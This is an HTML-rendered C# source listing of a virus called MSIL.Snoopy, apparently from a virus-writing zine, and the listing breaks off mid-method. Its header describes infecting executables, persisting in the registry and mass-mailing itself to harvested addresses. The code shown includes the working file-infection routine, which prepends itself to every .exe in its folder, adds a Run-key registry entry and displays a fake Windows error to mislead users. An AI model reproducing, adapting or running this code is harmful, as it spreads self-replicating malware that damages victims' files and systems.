<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.MSIL.Small.h - MSIL.Snoopy.cs.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc13 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/*************************************************************
 * C# - MSIL.Snoopy 
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 * by free0n
 * vx13d.net free0n@vx13d.net
 * ########################################################### 
 * ++Snoopy++
 * 
 * Snoopy replicates files that are in it's current directory
 * after it has done it's prepending it then checks the registry
 * to see if it's mass mailing has already run. If it hasn't it
 * spawns a new thread to send itself out. The stmp engine will 
 * search for emails in the my documents folder and does a dns 
 * lookup for mx records based on the email host it finds 
 * ex. you@hotmail.com woud look for hotmail.com mail servers. 
 * After the sending, if the day is equal to 8 it will display 
 * a message to the user that they have been infected. 
 * 
 * Note: Yes this looks like a console application which
 * would have a command prompt or dos box open but with
 * Snoopy you create the Console application then change
 * the output type to windows form (its in project properties). 
 * This makes it so it still runs like a console app but 
 * no dos box opens making it a little more sneaky
 * Use VC# express to build... 
 * 
 * Thanks to all the RRLF peeps for letting me
 * contribute to their kick ass mag. Keep vxing :)
 * 
 * Lates!
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">

</span><span class="sc3">/************************************************************
 * Start of Program.cs
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Generic</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Snoopy</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Program</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">Thread</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Snoopy</span><span class="sc0"> </span><span class="sc11">snoopy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Snoopy</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">snoopy</span><span class="sc10">.</span><span class="sc11">Replicate</span><span class="sc10">(</span><span class="sc11">myDir</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">snoopy</span><span class="sc10">.</span><span class="sc11">CheckReg</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Thread</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ThreadStart</span><span class="sc10">(</span><span class="sc11">snoopy</span><span class="sc10">.</span><span class="sc11">Send</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">t</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Day</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">snoopy</span><span class="sc10">.</span><span class="sc11">Message</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc3">/************************************************************
 * Start of Snoopy.cs
 * &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
 ************************************************************/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Generic</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Windows</span><span class="sc10">.</span><span class="sc11">Forms</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">Win32</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">.</span><span class="sc11">RegularExpressions</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Runtime</span><span class="sc10">.</span><span class="sc11">InteropServices</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Snoopy</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Snoopy</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">GetCurrentProcess</span><span class="sc10">().</span><span class="sc11">MainModule</span><span class="sc10">.</span><span class="sc11">FileName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">MyDocuments</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc2">//store the emails we find in myDocs folder and store the infected files in arInfect
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arrEmails</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arInfect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">


        </span><span class="sc2">//we must import the dns dll since .net doesn't have what were looking for :(
</span><span class="sc0">        </span><span class="sc10">[</span><span class="sc11">DllImport</span><span class="sc10">(</span><span class="sc6">"dnsapi"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">EntryPoint</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"DnsQuery_W"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CharSet</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CharSet</span><span class="sc10">.</span><span class="sc11">Unicode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SetLastError</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ExactSpelling</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">)]</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Dns</span><span class="sc10">([</span><span class="sc11">MarshalAs</span><span class="sc10">(</span><span class="sc11">UnmanagedType</span><span class="sc10">.</span><span class="sc11">VBByRefStr</span><span class="sc10">)]</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">strName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">intType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">intOpt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">intServer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc0"> </span><span class="sc11">pResult</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">intReserved</span><span class="sc10">);</span><span class="sc0">


        </span><span class="sc2">//our check to the registry if we ran it already..
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">CheckReg</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rK</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">)</span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc11">rK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Snoopy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Snoopy"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rS</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"Snoopy"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc11">rK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Snoopy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//my super little message add the windows form reference for messagbox
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Message</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc11">MessageBox</span><span class="sc10">.</span><span class="sc11">Show</span><span class="sc10">(</span><span class="sc6">"Infected with MSIL.Snoopy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Snoopy"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//replication for the directory which we pass in in program.cs
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Replicate</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc2">//replication method will target all exe's inside the directory
</span><span class="sc0">            </span><span class="sc2">//that we passed in dth. It's the current programs dir. So it 
</span><span class="sc0">            </span><span class="sc2">//will target all exectuables wherever it's ran in.
</span><span class="sc0">            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fiVirus</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">brVirus</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">fiVirus</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">virBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">fiVirus</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">

            </span><span class="sc2">//read the virus into the virBytes
</span><span class="sc0">            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">virBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">virBytes</span><span class="sc10">[</span><span class="sc11">v</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">brVirus</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//close streams, very important or else we get file in use errors..
</span><span class="sc0">            </span><span class="sc11">fiVirus</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">brVirus</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*.exe"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//for all the exe's we find in the directory
</span><span class="sc0">            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

                </span><span class="sc2">//get and retrieve the host data and store it into a byte array so we can
</span><span class="sc0">                </span><span class="sc2">//use it later
</span><span class="sc0">                </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">brHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">fsHost</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">//reading host data into hostBytes byte array
</span><span class="sc0">                </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">hostBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">fsHost</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">hostBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">hostBytes</span><span class="sc10">[</span><span class="sc11">h</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">brHost</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc2">//close streams
</span><span class="sc0">                </span><span class="sc11">brHost</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">fsHost</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc2">//this is our check I guess if the app is byte 60 is 128 don't infect 
</span><span class="sc0">                </span><span class="sc2">//if it is then we must infect
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hostBytes</span><span class="sc10">[</span><span class="sc4">60</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

                    </span><span class="sc2">//here we write the virus first then we write the rest of the host
</span><span class="sc0">                    </span><span class="sc2">//this is so later we can retrieve the first part of the virus and
</span><span class="sc0">                    </span><span class="sc2">//execute and then run our temp program.
</span><span class="sc0">                    </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fswHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">bwHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fswHost</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc2">//note:basestream is used here so we can use the WriteByte method
</span><span class="sc0">                    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">virBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">bwHost</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">virBytes</span><span class="sc10">[</span><span class="sc11">v</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">hh</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">hostBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">hh</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">bwHost</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">hostBytes</span><span class="sc10">[</span><span class="sc11">hh</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc2">//close both streams
</span><span class="sc0">                    </span><span class="sc11">bwHost</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">fsHost</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                    </span><span class="sc2">//add the infected file to the arraylist
</span><span class="sc0">                    </span><span class="sc11">arInfect</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//fileinfo makes getting filesizes easy :)
</span><span class="sc0">            </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">fi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//we use size to tell if it's the original program
</span><span class="sc0">            </span><span class="sc2">//or an infected file this comes in handy mostly for
</span><span class="sc0">            </span><span class="sc2">//debugging
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">20480</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//this is the original program and error out | note: this will occur after it's already infected other exe's 
</span><span class="sc0">                </span><span class="sc11">MessageBox</span><span class="sc10">.</span><span class="sc11">Show</span><span class="sc10">(</span><span class="sc6">"Not a valid win32 program"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Windows"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxButtons</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxIcon</span><span class="sc10">.</span><span class="sc11">Error</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Application</span><span class="sc10">.</span><span class="sc11">Exit</span><span class="sc10">();</span><span class="sc0">
